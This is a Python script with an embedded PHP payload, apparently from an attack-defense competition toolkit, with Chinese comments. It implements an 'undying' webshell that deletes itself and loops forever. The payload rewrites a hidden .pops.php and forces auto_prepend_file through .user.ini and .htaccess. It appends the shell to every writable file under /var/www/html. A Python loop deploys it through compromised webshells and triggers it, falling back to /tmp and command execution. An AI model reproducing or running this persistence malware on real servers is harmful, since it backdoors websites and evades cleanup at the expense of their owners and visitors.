
file='''<?php
function filescan($dir){
    $files = [];
    foreach(scandir($dir) as $path){
        if($path!='.'&&$path!='..'){
            if(is_dir($path)){
                foreach(scandir($dir.'/'.$path) as $path2){
                    if($path2!='.'&&$path2!='..'){
                        $files[] = $dir.'/'.$path.'/'.$path2;
                    }
                    
                }
            }
            $files[] = $dir.'/'.$path;
            
        }
    }
   return $files;
}

function writeshell($file,$shell){
    if(is_dir($file)){
        $shellname = $file.'/.pops.php';
        $rst = file_put_contents($shellname,$shell);
    } else{
        $rst = file_put_contents($file,'?>'.$shell,FILE_APPEND);
    }
    if($rst){
        return $shellname?$shellname:$file;
        }
}
function undie(){
    $content = base64_decode('{content}');
    set_time_limit(0);
    ignore_user_abort(1); #1表示，忽略与客户端断开连接，继续执行脚本
    unlink(__FILE__); #执行完后删除自身
    while (1) {
        file_put_contents("/var/www/html/.pops.php", $content);
        file_put_contents("/tmp/sess_adasdifsdfijjiji", $content);
        file_put_contents('/var/www/html/.user.ini','auto_prepend_file=/tmp/sess_adasdifsdfijjiji');
        file_put_contents('/var/www/html/.htaccess','<Files .htaccess>
        SetHandler application/x-httpd-php
        Require all granted
        php_flag engine on
        </Files>
        php_value auto_prepend_fi\
        le .htaccess
        #'.$shell);
        $shell = [];
        foreach(filescan('/var/www/html/') as $file){
            if(is_writable($file)){
                $shell[] = writeshell($file,$content);
            }
        }
        print_r(json_encode($shell));
        sleep(1);
    }
}


undie();
?>'''

import time
from lib import request
from webshell import *
import base64
def maintain(webshells,log):
    log.info('权限维持线程启动')
    while True:
        for shells in webshells.values():
            for shell in shells:
                if shell.write('/var/www/html/.undie.php',file.replace('{content}',base64.b64encode(shell1.Shell1.CONTENT.encode()).decode())):
                    request.get(url=re.search('http://.*?/',shell.url).group(0)+'.undie.php').text  #触发不死马
                    log.info('{}不死马写成功'.format(shell.url))
                    break
                else:                                        #不可写的话则尝试写到tmp目录，利用命令执行或另起php来运行不死马
                    if shell.write('/tmp/.pops',file.replace('{content}',base64.b64encode(shell1.Shell1.CONTENT.encode()).decode())):
                        shell.run('include("/tmp/.pops");')   #兼容命令执行和代码执行
                        shell.run('php /tmp/.pops')
                        log.info('{}不死马写成功'.format(shell.url))
                        break
        time.sleep(3)